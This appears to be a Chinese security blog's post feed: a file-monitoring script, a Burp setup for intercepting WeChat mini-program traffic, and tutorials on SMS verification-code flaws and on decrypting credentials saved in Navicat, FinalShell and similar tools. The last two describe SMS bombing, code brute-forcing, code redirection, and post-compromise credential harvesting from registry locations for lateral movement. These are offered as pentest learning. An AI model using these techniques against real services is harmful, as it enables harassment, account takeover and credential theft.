= action_time + <span class="string">&#x27; &#x27;</span> + action + event.src_path</span><br><span class="line">        <span class="built_in">print</span>(deleted_log)</span><br><span class="line">        ws.cell(row=self.rows, column=<span class="number">1</span>).value = action_time</span><br><span class="line">        ws.cell(row=self.rows, column=<span class="number">2</span>).value = action</span><br><span class="line">        ws.cell(row=self.rows, column=<span class="number">3</span>).value = event.src_path</span><br><span class="line">        self.rows += <span class="number">1</span></span><br><span class="line">        wb.save(filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mkdir</span>(<span class="params">path</span>):</span></span><br><span class="line">    folder = os.path.exists(path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> folder:  <span class="comment"># 判断是否存在文件夹如果不存在则创建为文件夹</span></span><br><span class="line">        os.makedirs(path)  <span class="comment"># makedirs 创建文件时如果路径不存在会创建这个路径</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    [+] Please enter your Destination of monitoring path after the monitor.py</span></span><br><span class="line"><span class="string">    [+] Example: python monitor.py D:\test</span></span><br><span class="line"><span class="string">    [+] Default monitoring path is current path if you don&#x27;t enter any path</span></span><br><span class="line"><span class="string">    [+] The logs will be saved in D:\Monitoring record</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    des_file = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="string">&quot;.&quot;</span></span><br><span class="line">    <span class="comment"># 创建目录</span></span><br><span class="line">    path = <span class="string">r&quot;D:\Monitoring record&quot;</span></span><br><span class="line">    mkdir(path)</span><br><span class="line"></span><br><span class="line">    wb = openpyxl.Workbook()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 新建一个excel文件，并且在单元表为&quot;sheet1&quot;的表中写入数据</span></span><br><span class="line">    ws = wb.create_sheet(<span class="string">&quot;sheet1&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 调整列宽</span></span><br><span class="line">    ws.column_dimensions[<span class="string">&#x27;A&#x27;</span>].width = <span class="number">20.0</span></span><br><span class="line">    ws.column_dimensions[<span class="string">&#x27;B&#x27;</span>].width = <span class="number">10.0</span></span><br><span class="line">    ws.column_dimensions[<span class="string">&#x27;C&#x27;</span>].width = <span class="number">80.0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 在单元格中写入数据</span></span><br><span class="line">    ws.cell(row=<span class="number">1</span>, column=<span class="number">1</span>).value = <span class="string">&quot;时间&quot;</span></span><br><span class="line">    ws.cell(row=<span class="number">1</span>, column=<span class="number">2</span>).value = <span class="string">&quot;行为&quot;</span></span><br><span class="line">    ws.cell(row=<span class="number">1</span>, column=<span class="number">3</span>).value = <span class="string">&quot;文件路径&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 日志文件名</span></span><br><span class="line">    filename = path + <span class="string">&quot;\\\\&quot;</span> + time.strftime(<span class="string">&quot;%Y-%m-%d %H-%M-%S&quot;</span>, time.localtime()) + <span class="string">&quot;.xlsx&quot;</span></span><br><span class="line"></span><br><span class="line">    event_handler = MyHandler()</span><br><span class="line">    observer = Observer()</span><br><span class="line">    observer.schedule(event_handler, path=des_file, recursive=<span class="literal">True</span>)</span><br><span class="line">    observer.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        observer.stop()</span><br><span class="line">    observer.join()</span><br></pre></td></tr></table></figure>

<h2 id="4、系统实现结果"><a href="#4、系统实现结果" class="headerlink" title="4、系统实现结果"></a>4、系统实现结果</h2><p>&emsp;&emsp;如果要监控“D:\监控文件夹”下的内容，运行monitor.py，命令：<code>python monitor.py D:\监控文件夹</code></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642141376372-0842d0eb-0726-4f2a-b0e0-f5f385fae0c2.png" alt="img"></p>
<p>&emsp;&emsp;此时程序就在后台监控目标路径的文件了，在监控文件夹的创建，修改，删除等操作等会显示在终端中</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642141390668-c9a92054-115a-4d52-89d6-984b07c16902.png" alt="img"></p>
<p>&emsp;&emsp;而操作的记录也会保存到D:\Monitoring record的文件夹的excel表格的sheet1表中</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642141403543-d4e2037f-0960-4b78-96b4-757db3548a63.png" alt="img"></p>
<h2 id="5、总结"><a href="#5、总结" class="headerlink" title="5、总结"></a>5、总结</h2><h3 id="（1）问题及解决方案"><a href="#（1）问题及解决方案" class="headerlink" title="（1）问题及解决方案"></a>（1）问题及解决方案</h3><p>问题1：每次启动程序后，操作记录写入excel中，都会覆盖写入，而不是追加写入，因此旧的操作记录将会消失</p>
<p>解决1：每次重新启动程序，获取当前时间，并将程序启动时刻作为文件名来命名excel表，因此每次重新启动程序都会有一张新的excel表而不会覆盖写旧表。</p>
<h3 id="（2）收获"><a href="#（2）收获" class="headerlink" title="（2）收获"></a>（2）收获</h3><p>通过自己动手，又学会了一项新技能，拓展了知识面，锻炼了代码编写能力</p>
<h3 id="（3）优缺点"><a href="#（3）优缺点" class="headerlink" title="（3）优缺点"></a>（3）优缺点</h3><p>优点：①可以让用户自主选择监控文件夹 ②有良好的使用提示（运行程序时显示的4条Tips）③重写了events的函数和类</p>
<p>缺点：①相对于目前其他程序实现的功能基本比较完善，但是有些功能点还没有实现，例如监控键盘的操作记录，这个可以使用python的pynput模块来完成，具体可以参考之前的博客<a href="https://wolke.cn/post/90a9d002.html">https://wolke.cn/post/90a9d002.html</a> ，这样结合起来不仅可以监控操作了什么文件，更可以监控修改了什么内容。</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>一次burp无法抓微信PC端小程序的头疼经历以及解决方案</title>
    <url>/post/af7cceea.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>今天想用burp对PC的微信小程序进行渗透测试，发现怎么抓也抓不到，明明之前可以抓的，经过几小时的研究和资料搜集，终于解决。顺手把如何对手机/模拟器进行抓包也写了下，在<strong>文末</strong>我会提到是如何解决这个头疼且深刻的问题，这个问题我相信大家应该都会有，希望能帮助到大家。</p>
<h1 id="一、抓手机-模拟器的微信公众号、小程序、APP"><a href="#一、抓手机-模拟器的微信公众号、小程序、APP" class="headerlink" title="一、抓手机/模拟器的微信公众号、小程序、APP"></a>一、抓手机/模拟器的微信公众号、小程序、APP</h1><p><strong>前提：保证电脑和手机在同一局域网</strong></p>
<h3 id="（1）初阶"><a href="#（1）初阶" class="headerlink" title="（1）初阶"></a>（1）初阶</h3><p>电脑端使用<code>ipconfig</code>查看当前IP地址</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1661159497410-725328bc-5028-44fb-bd45-9f0a37632405.png" alt="img"></p>
<p>手机端打开WLAN设置，手动指定代理，代理IP地址为电脑端的IP地址例如上面的192.168.43.170，端口设置为例如8081</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1661159613326-13adefcb-d73b-47f6-be28-07a5202dc4f9.jpeg" alt="img"></p>
<p>此时打开burp，设置监听（非本地回环地址）</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1661159857017-ff6b120f-9223-4a2a-a071-61f8b4bdcdb0.png" alt="img"></p>
<p>此时，burp就能抓手机访问网页的包了。</p>
<p>但是对于一些HTTPS的站点，手机访问会弹出警告——<strong>证书不受信任</strong></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1661159999794-2d2e2e59-1bb6-4f69-ba71-371d99d2898f.png" alt="img"></p>
<p>点击确定继续后，burp才可以抓到该数据包</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1661158953863-bfe2d65b-11b4-4a19-8c7a-476b8a397053.png" alt="img"></p>
<h3 id="（2）进阶"><a href="#（2）进阶" class="headerlink" title="（2）进阶"></a>（2）进阶</h3><p>上面的方法很快就能用手机进行渗透测试，但是有一个问题：<strong>对HTTPS站点的渗透很繁琐甚至无效，以及对微信公众号(抓不全)和小程序会出现抓不到包、无法抓取app的情况。</strong>在手机导入一个burp证书即可</p>
<p>手机设置好代理后，访问<a href="http://burp/">http://burp</a> 下载证书，下载的一般默认是der格式，修改成cer格式，然后从存储设备安装即可，凭据用途可以“WLAN”、“VPN和应用”都安装。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1661179694732-6f55bed7-90dd-47a9-96fa-e49586feebb3.jpeg" alt="img"></p>
<p>安装好证书后，即可抓取公众号、小程序、app的包</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1661179840850-0697bd4d-3f4d-43a7-8c78-675a575d9015.png" alt="img"></p>
<h1 id="二、抓电脑端微信公众号、小程序"><a href="#二、抓电脑端微信公众号、小程序" class="headerlink" title="二、抓电脑端微信公众号、小程序"></a>二、抓电脑端微信公众号、小程序</h1><p>burp设置好代理，导出证书</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1661185277596-89aa925f-818c-47e3-9d53-b8506112ffc4.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1661185294327-5bfecb42-6d0a-417b-a76d-ef9aedc6a558.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1661185317157-6d7d32cc-af16-4281-8845-6eb11ac6551f.png" alt="img"></p>
<p>打开Edge浏览器——设置——隐私、搜索和服务——管理证书，下载证书并导入，注意一定是选择<strong>受信任的根证书颁发机构</strong></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1661185379800-4094535c-3dde-4d7b-ad88-c472bb530772.png" alt="img"></p>
<p>导入好证书后，设置好代理</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1661185421818-fde582f8-a964-4109-bb81-7337b4daafc2.png" alt="img"></p>
<p>按理来说，这样就可以抓到公众号和小程序的包了，但实际情况是完全抓不到<strong>小程序</strong>的包。</p>
<p>我们可以退出微信PC端，将目录<code>C:\Users\用户名\AppData\Roaming\Tencent\WeChat\XPlugin\Plugins\WMPFRuntime</code>目录下的<strong>所有文件删除</strong></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1661185657600-0c83caa9-1f2d-42cb-92f4-71edb7fcb17a.png" alt="img"></p>
<p><strong>重新登录微信</strong>，再次尝试抓小程序的包，就可以抓到包了。</p>
<p>可能有的师傅没有这个目录，我们可以随便打开一个微信小程序，打开任务管理器，定位到小程序的进程，打开文件所在位置</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1661185778036-0da5b0fa-2ef8-41fe-a040-2bb7304a0511.png" alt="img"></p>
<p>回退到Plugins目录下，进入WMPFRuntime文件夹，退出微信，删除该文件夹目录下所有文件，重新登录微信PC端即可抓到小程序的包。</p>
<p>这样不是长久之计，但目前能做的只有抓不到就删除一次，抓不到删除一次，问我为什么这样就可以了，我也不懂hhh。有师傅有更好的解决方案，欢迎评论区提出~</p>
]]></content>
      <categories>
        <category>安全工具/安全开发</category>
      </categories>
      <tags>
        <tag>BurpSuite</tag>
        <tag>微信小程序</tag>
      </tags>
  </entry>
  <entry>
    <title>关于验证码的那些漏洞</title>
    <url>/post/48a6d673.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>最近看到十二师傅写了篇关于验证码漏洞的文章，觉得总结得很好，也学到了一些新思路，让我受益匪浅，原文链接：</p>
<p><a href="https://www.yuque.com/shier-mfbht/qh4bgb/zcee3k">https://www.yuque.com/shier-mfbht/qh4bgb/zcee3k</a></p>
<h1 id="一、短信轰炸"><a href="#一、短信轰炸" class="headerlink" title="一、短信轰炸"></a>一、短信轰炸</h1><p>这类漏洞存在的原因是没有对短信验证码的发送时间、用户及其IP作一些限制。</p>
<h3 id="1、正常的短信轰炸"><a href="#1、正常的短信轰炸" class="headerlink" title="1、正常的短信轰炸"></a>1、正常的短信轰炸</h3><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657548221735-3d287e51-0c22-4f32-a11e-e3461206f09d.png" alt="img"></p>
<p>burp一直发包即可</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657548238490-b0b6fef6-3aa6-447b-b93f-15a3561f9df4.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657548267171-baa3f5d5-2ee1-4c2f-9277-71ca5856ca0c.png" alt="img"></p>
<h3 id="2、并发绕过"><a href="#2、并发绕过" class="headerlink" title="2、并发绕过"></a>2、并发绕过</h3><p>做了限制咋办？可以试试并发(万物皆可并发)</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657548288920-7829946b-8f55-448e-a09c-4bf230b89b20.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657548293630-75b3902d-43bd-491f-baf0-c3cbbd85b5a2.png" alt="img">    使用<code>turbo intruder</code>插件进行并发。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657548692068-c6acca6a-4c0d-43d0-a77e-faa44c5ce993.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657548719465-d923a439-b862-4fa5-b1d0-01e620bed90c.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549918362-4e740287-7b46-4f37-8ba9-b516011af3d8.jpeg" alt="img"></p>
<p>并发次数越大是不是轰炸就越多</p>
<h3 id="3、删除Cookie绕过"><a href="#3、删除Cookie绕过" class="headerlink" title="3、删除Cookie绕过"></a>3、删除Cookie绕过</h3><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657548916343-2489537a-ca97-43b3-9029-4ee9f9a72855.png" alt="img"></p>
<p>可以尝试把cookie删掉，有些开发就可能根据cookie判断验证码是否获取过</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657548933758-d03bf4e8-ee1f-4d41-b95a-96bf78d2b55c.png" alt="img"></p>
<h3 id="4、特殊格式绕过"><a href="#4、特殊格式绕过" class="headerlink" title="4、特殊格式绕过"></a>4、特殊格式绕过</h3><ol>
<li>手机号码前后加空格，86，086，0086，+86，0，00，/r,/n, 以及特殊符号等</li>
<li>修改cookie，变量，返回</li>
<li><code>138888888889</code> 12位经过短信网关取前11位，导致短信轰炸</li>
<li>进行能解析的编码。</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549226009-fc07971f-8cf0-49dc-8d6a-89b9b51f1ab6.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549221100-a2d56d6a-2737-4ff7-870d-1a08c494e952.png" alt="img"></p>
<h1 id="二、暴力破解（任意用户登录注册）"><a href="#二、暴力破解（任意用户登录注册）" class="headerlink" title="二、暴力破解（任意用户登录注册）"></a>二、暴力破解（任意用户登录注册）</h1><p>服务端未对验证时间、次数作出限制，存在爆破的可能性。简单的系统存在可以直接爆破的可能性，但做过一些防护的系统还得进行一些绕过才能进行爆破。 </p>
<p>burpsuite对纯数字验证码爆破时间估计：</p>
<ul>
<li>对于4位纯数字验证码：从0000~9999的10000种可能用多线程在5分钟内跑完并不是很难。 </li>
<li>对于6位纯数字验证码：六位数的验证码1000000位，单从爆破时间上来看就比4位数的多100倍。</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549446799-c3c77bd9-8d80-4e50-9b3b-6139dd8313cd.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549451102-58edbada-727e-4b73-9a72-9bccb9f4c0e7.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549462214-9942ac48-9e26-461f-bda7-9186fd253130.png" alt="img"></p>
<h1 id="三、验证码回显"><a href="#三、验证码回显" class="headerlink" title="三、验证码回显"></a>三、验证码回显</h1><p>验证码在返回包，观察包即可</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549489713-45dcb32b-1861-4a4f-8e3b-b9d6c6c95227.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549502881-a7774fcc-ed13-47f2-97bb-26eb9cb0f238.png" alt="img"></p>
<h1 id="四、验证码绕过"><a href="#四、验证码绕过" class="headerlink" title="四、验证码绕过"></a>四、验证码绕过</h1><p>用户绑定了手机号，正常来说是获取绑定手机号的短信，通过burp修改成其他手机号</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549575648-bb8743bc-401c-4850-a95b-4994447f2dc5.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549580750-6f272f78-2b58-4f8d-91d1-a173da998f9c.png" alt="img"></p>
<p>把这个手机号改成其他手机号的</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549590420-3c1b9540-6e17-4eb6-9dc9-100993e3b2ef.png" alt="img"></p>
<p>点击提交，抓包改成其他刚刚接收短信的手机号</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549602079-38e288a7-ae0b-42a6-b0a1-5f2c437a4a57.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549607812-3520bea5-8135-45d0-b17f-8c46e0e33c64.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549612419-49e1ebee-76b9-4557-ae53-12c8fb7089d6.png" alt="img"></p>
<h1 id="五、验证码转发"><a href="#五、验证码转发" class="headerlink" title="五、验证码转发"></a>五、验证码转发</h1><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549623380-676c8547-dec5-407d-a0c7-dde791210502.png" alt="img"></p>
<p>加个逗号后面接上需要转发的手机号，因为开发可能使用数组就导致同时把验证码发给两个手机号</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549738912-57b0e432-cf06-4e1b-b742-08d77e13d92c.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549745451-b3941f52-4a2f-496c-8406-8528124ba57f.png" alt="img"></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>验证码</tag>
      </tags>
  </entry>
  <entry>
    <title>内网常用工具密码解密【扩大战果】</title>
    <url>/post/37cc6900.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>当通过一些方法拿到系统权限后，系统中可能存在连接其他服务器、数据库的远程管理软件，这时候就需要去解密像ssh这类的连接软件，获取更多主机得权限来扩大战果。</p>
<h1 id="二、运维软件"><a href="#二、运维软件" class="headerlink" title="二、运维软件"></a>二、运维软件</h1><p>当我通过一个MS-17-010漏洞RDP到内网运维主机上面，发现桌面有Navicat（数据库管理工具）和FinalShell（服务器远程管理工具）。当然咱要想办法解密软件连接过的服务器和数据库的密码获得更多分数。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1676859201948-3b3f3556-1f01-4e25-8945-d5ea112b704b.png" alt="1676859201948-3b3f3556-1f01-4e25-8945-d5ea112b704b"></p>
<h3 id="1、FinalShell"><a href="#1、FinalShell" class="headerlink" title="1、FinalShell"></a>1、FinalShell</h3><p>FinalShell是一体化的的服务器网络管理软件，不仅是ssh客户端，还是功能强大的开发、运维工具，充分满足开发、运维需求。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1676859222486-a9e06568-6204-49e4-bce6-dfddf885ac27.png" alt="1676859222486-a9e06568-6204-49e4-bce6-dfddf885ac27"></p>
<h3 id="2、Navicat"><a href="#2、Navicat" class="headerlink" title="2、Navicat"></a>2、Navicat</h3><p>Navicat是一套可创建多个连接的数据库管理工具，用以方便管理 MySQL、Oracle、PostgreSQL、SQLite、SQL Server、MariaDB和/或 MongoDB 等不同类型的数据库，并支持管理某些云数据库，例如阿里云、腾讯云。</p>
<p>连接信息是存在注册表里面</p>
<table>
<thead>
<tr>
<th>数据库</th>
<th>注册表位置</th>
</tr>
</thead>
<tbody><tr>
<td>MySQL</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers&lt;your connection name&gt;</td>
</tr>
<tr>
<td>MariaDB</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers&lt;your connection name&gt;</td>
</tr>
<tr>
<td>MicrosoftSQL</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers&lt;your connection name&gt;</td>
</tr>
<tr>
<td>Oracle</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers&lt;your connection name&gt;</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers&lt;your connection name&gt;</td>
</tr>
<tr>
<td>SQLite</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers&lt;your connection name&gt;</td>
</tr>
<tr>
<td>MongoDB</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers&lt;your connection name&gt;</td>
</tr>
</tbody></table>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1676859573919-04cf4cd7-fe03-4937-8bd9-1da2c22f7e67.png" alt="1676859573919-04cf4cd7-fe03-4937-8bd9-1da2c22f7e67"></p>
<p>TeamViewer，FileZilla，WinSCP，Xmangager系列产品（Xshell,Xftp)等工具</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1676859690186-e762417a-bd48-4e26-8a22-76f4ea80b1f8.png" alt="1676859690186-e762417a-bd48-4e26-8a22-76f4ea80b1f8"></p>
<h1 id="三、解密姿势"><a href="#三、解密姿势" class="headerlink" title="三、解密姿势"></a>三、解密姿势</h1><p>工具地址：</p>
<ul>
<li><a href="https://github.com/passer-W/FinalShell-Decoder">https://github.com/passer-W/FinalShell-Decoder</a></li>
<li><a href="https://github.com/uknowsec/SharpDecryptPwd">https://github.com/uknowsec/SharpDecryptPwd</a></li>
</ul>
<p>FinallShell 密码解密</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1676859728812-677f1b7a-cb8a-40a2-8533-5ca5732934da.png" alt="1676859728812-677f1b7a-cb8a-40a2-8533-5ca5732934da"></p>
<p>可在文本框中直接输入路径或点击选择按钮选择FinalShell配置文件根路径，一般在 <code>**%FINALSHELL_INSTALL_PATH%/conn**</code> 目录下：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1676859762499-dfec8bca-edfe-49d5-944a-407b18ee846c.png" alt="1676859762499-dfec8bca-edfe-49d5-944a-407b18ee846c"></p>
<p>也可将远程主机文件下载到本地解密，输入合法路径后自动生成所有主机配置信息：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1676859792179-b70aa115-87ca-4eb1-bdcf-31afc0d12699.png" alt="1676859792179-b70aa115-87ca-4eb1-bdcf-31afc0d12699"></p>
<p>对密码已保存在Windows系统上的部分程序进行解析，包括：Navicat，TeamViewer，FileZilla，WinSCP，Xmanager系列产品（Xshell、Xftp）。以Navicat为例</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1676859900371-3a2ceba3-a184-4868-abf5-5197f0eb5437.png" alt="1676859900371-3a2ceba3-a184-4868-abf5-5197f0eb5437"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1676859920229-3e3f20f2-b559-4297-a9e8-15ebf630f0f6.png" alt="1676859920229-3e3f20f2-b559-4297-a9e8-15ebf630f0f6"></p>
<h1 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h1><p><a href="https://mp.weixin.qq.com/s/etVdauWL4jbcY1yTKe5zkw">https://mp.weixin.qq.com/s/etVdauWL4jbcY1yTKe5zkw</a></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
  </entry>
  <entry>
    <title>加密编码算法</title>
    <url>/post/57602181.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>&emsp;&emsp;在渗透测试中，常见的密码等敏感信息会采用加密处理，其中作为安全测试人员必须要了解常见的加密方式，才能为后续的安全测试做好准备，本次课程将讲解各种加密编码等知识，便于后期的学习和发展</p>
<h1 id="二、常见加密编码等算法解析"><a href="#二、常见加密编码等算法解析" class="headerlink" title="二、常见加密编码等算法解析"></a>二、常见加密编码等算法解析</h1><p>&emsp;&emsp;MD5，SHA，ASC，进制，时间戳，URL，BASE64，Unescape，AES，DES等</p>
<h2 id="1、MD5（不可逆）"><a href="#1、MD5（不可逆）" class="headerlink" title="1、MD5（不可逆）"></a>1、MD5（不可逆）</h2><p>&emsp;&emsp;16位和32位，加密密文字符串由A-F,0-9随机分配，80%网站管理员或用户密码加采取MD5加密。(不可逆)</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631426676161-c5207f4e-1428-47ce-9010-f80620b3d40b.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631426783155-a2d53afe-f8c2-4f8e-b5f8-fedc743a8f62.png" alt="img"></p>
<p>&emsp;&emsp;网上的MD5在线工具，它的解密过程是用了枚举方法</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009295062-a4e72231-36a0-4be4-ac79-0340fa3d17e8.png" alt="img"></p>
<h2 id="2、SHA"><a href="#2、SHA" class="headerlink" title="2、SHA"></a>2、SHA</h2><p>&emsp;&emsp;由A-Z，0-9随机组合，SHA1，SHA256，SHA384，SHA512长度固定。(不可逆）</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009295136-57840de0-5012-4b7c-ac74-2d1c97e41211.png" alt="img"></p>
<h2 id="3、进制"><a href="#3、进制" class="headerlink" title="3、进制"></a>3、进制</h2><p>&emsp;&emsp;16进制加密</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631427004811-2c9cc3e6-d6b8-4db1-8390-0cb09922eed0.png" alt="img"></p>
<h2 id="4、Unix时间戳"><a href="#4、Unix时间戳" class="headerlink" title="4、Unix时间戳"></a>4、Unix时间戳</h2><p>&emsp;&emsp;网站或者服务器脚本语言里经常会使用，会在数据库里用户登录和注销，注册里会使用</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631427097207-92187c11-18a6-4402-8ccf-b6affe403e15.png" alt="img"></p>
<h2 id="5、URL"><a href="#5、URL" class="headerlink" title="5、URL"></a>5、URL</h2><p>&emsp;&emsp;浏览器只做一次加密，在渗透绕过的时候可能会使用二次，三次加密方式</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009295291-0cc7eda4-7dac-4031-b66a-d5aef5655877.png" alt="img"></p>
<h2 id="6、Base64"><a href="#6、Base64" class="headerlink" title="6、Base64"></a>6、Base64</h2><p>&emsp;&emsp;大小写随机组合，在字符串后面经常出现一个或两个等号</p>
<p>&emsp;&emsp;明文越长，密文越长</p>
<p>&emsp;&emsp;常见应用：代码、密码、参数</p>
<p>&emsp;&emsp;浏览器只做一次加密，在渗透绕过的时候可能会使用二次，三次加密方式</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009295381-29bdb9b3-1184-4348-819c-b6394c52daaa.png" alt="img"></p>
<h2 id="7、Unescape"><a href="#7、Unescape" class="headerlink" title="7、Unescape"></a>7、Unescape</h2><p>&emsp;&emsp;%u+4位数字，对应两位字符，主要应用WEB应用上</p>
<p>&emsp;&emsp;当明文字符数量为单数时</p>
